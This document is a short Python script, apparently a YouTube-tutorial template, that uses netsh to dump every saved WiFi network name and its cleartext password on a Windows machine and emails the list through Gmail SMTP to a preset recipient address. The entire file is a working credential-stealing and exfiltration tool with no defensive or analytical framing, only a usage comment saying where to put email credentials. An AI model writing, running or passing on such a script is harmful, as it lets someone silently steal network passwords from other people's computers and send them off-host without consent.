#! py
# [Your Name], [Year]
# Paste your URL here
# Paste your YouTube channel URL here

# Usage: This code collects and emails WiFi profile names and passwords
# to a specified email address. Please replace "login_name" and "password"
# with your valid Gmail account credentials in the email section.

import subprocess
import re
import smtplib
from email.message import EmailMessage

# Function to retrieve SSID and Passwords
def get_wifi_profiles():
    # Execute command to retrieve WiFi profiles
    profiles = subprocess.check_output(
        'netsh wlan show profiles',
        shell=True).decode('utf-8', errors="backslashreplace")
    # Use regex to find WiFi profile names
    profile_names = re.findall(r'All User Profile\s*:\s*(.*)\s*', profiles)
    
    # List to hold WiFi profile details
    wifi_list = []

    # Iterate over profiles to get passwords
    for name in profile_names:
        results = subprocess.check_output(
            f'netsh wlan show profile name="{name}" key=clear',
            shell=True).decode('utf-8', errors="backslashreplace")
        
        # Find the password using regex
        password = re.search(r'Key Content\s*:\s*(.*)\s*', results)
        
        # Clean and store profile info
        password = password.group(1) if password else 'N/A'
        wifi_list.append((name, password))
    
    return wifi_list

# Function to send an email with WiFi profiles
def send_email(receiver_email, subject, body):
    try:
        # Create Email Message
        msg = EmailMessage()
        msg['Subject'] = subject
        msg['From'] = 'login_name@gmail.com'
        msg['To'] = receiver_email
        msg.set_content(body)
        
        # Send the email using your credentials
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login('login_name@gmail.com', 'password')
            smtp.send_message(msg)
        
        print("Email sent successfully.")
    except Exception as e:
        print("Failed to send email:", e)

# Main Logic
if __name__ == '__main__':
    # Retrieve WiFi profiles
    profiles = get_wifi_profiles()
    
    # Format message body
    body = "WiFi Profile:\n\n"
    for ssid, password in profiles:
        body += f"SSID: {ssid}\tPassword: {password}\n"
    
    # Replace with your receiver's email
    send_email('receiver_email@example.com', 'WiFi Profiles', body)